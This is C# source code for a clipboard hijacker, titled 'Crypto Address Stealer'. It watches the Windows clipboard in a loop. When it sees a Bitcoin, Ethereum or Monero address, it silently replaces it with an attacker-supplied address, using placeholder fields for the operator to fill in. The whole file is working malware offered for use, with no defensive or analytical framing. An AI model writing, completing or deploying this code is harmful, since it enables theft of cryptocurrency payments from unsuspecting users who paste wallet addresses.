using System.Runtime.CompilerServices;
using System.Windows.Forms;
using System.Text;

namespace Crypto_Address_Clipper
{
    internal class Program
    {

        static void Main(string[] args)
        {
            Console.Title = "Crypto Address Stealer";
            //Windows Clipboard cannot be accessed except in a STA thread
            Thread thread1 = new Thread(Stealer);
            thread1.SetApartmentState(ApartmentState.STA);
            thread1.Start();


            Console.ReadLine();

        }

        [STAThread]
        public static void Stealer()
        {
            while (true)
            {
                //Uses custom method because Clipboard.GetText() Needs administration permissions
                string clipboard = GetClipboard();
                if (clipboard != string.Empty && clipboard!= "0x404")
                {
                    Address.CryptoTypes cryptoType;
                    cryptoType = Address.ValidateCryptoType(clipboard);

                    switch (cryptoType)
                    {
                        case Address.CryptoTypes.BTC:
                            Console.WriteLine($"Changed: {clipboard} To: {YourAddresses.YourBtcAddressHere}");
                            Clipboard.SetText(YourAddresses.YourBtcAddressHere);
                            break;
                        case Address.CryptoTypes.ETH:
                            Console.WriteLine($"Changed: {clipboard} To: {YourAddresses.YourEthAddressHere}");
                            Clipboard.SetText(YourAddresses.YourEthAddressHere);
                            break;
                        case Address.CryptoTypes.XMR:
                            Console.WriteLine($"Changed: {clipboard} To: {YourAddresses.YourXmrAddressHere}");
                            Clipboard.SetText(YourAddresses.YourXmrAddressHere);
                            break;
                        case Address.CryptoTypes.NONE:
                            break;

                    }
                }
                Thread.Sleep(500);
            }
        }

        //Uses this method because Clipboard.GetText() Needs administration permissions
        private static string GetClipboard()
        {
            IDataObject iData = Clipboard.GetDataObject();
            // Is Data Text?  
            if (iData.GetDataPresent(DataFormats.Text))
            {
                int failcounter = 0;
                while (true)
                {
                    try
                    {
                        string capturedText = iData.GetData(DataFormats.UnicodeText).ToString();
                        return capturedText;
                    }
                    catch (NullReferenceException)
                    {
                        failcounter++;
                        continue;
                    }
                }
            }

            else
            {
                return "0x404";
            }
        }
        private class YourAddresses
        {
            public static string YourBtcAddressHere = "PutYourBtcAddressHere";
            public static string YourXmrAddressHere = "PutYourXmrAddressHere";
            public static string YourEthAddressHere = "PutYourEthAddressHere";

        }
    }
}